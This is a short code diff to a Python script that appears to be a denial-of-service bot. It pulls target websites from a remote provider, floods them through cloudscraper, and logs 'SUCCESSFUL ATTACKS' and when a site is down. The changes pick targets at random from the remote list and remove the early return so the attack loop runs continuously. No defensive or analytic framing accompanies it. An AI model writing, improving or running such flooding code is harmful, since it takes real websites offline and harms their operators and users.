@@ -8,6 +8,7 @@ from gc import collect
 from os import system
 from sys import stderr
 from threading import Thread
+from random import choice
 from time import sleep
 
 import cloudscraper
@@ -71,7 +72,7 @@ def mainth():
     while True:
         logger.info("GET RESOURCES FOR ATTACK")
         try:
-            site = remoteProvider.get_target_site()
+            site = choice(remoteProvider.get_target_sites())
         except Exception as e:
             logger.exception(e)
             sleep(5)
@@ -107,12 +108,11 @@ def mainth():
                 logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
         except ConnectionError as exc:
             logger.success(f"{site} is down: {exc}")
+            continue
         except Exception as exc:
             result = f"issue happened: {exc}"
             logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
             continue
-        finally:
-            return result, site
 
 
 def clear():
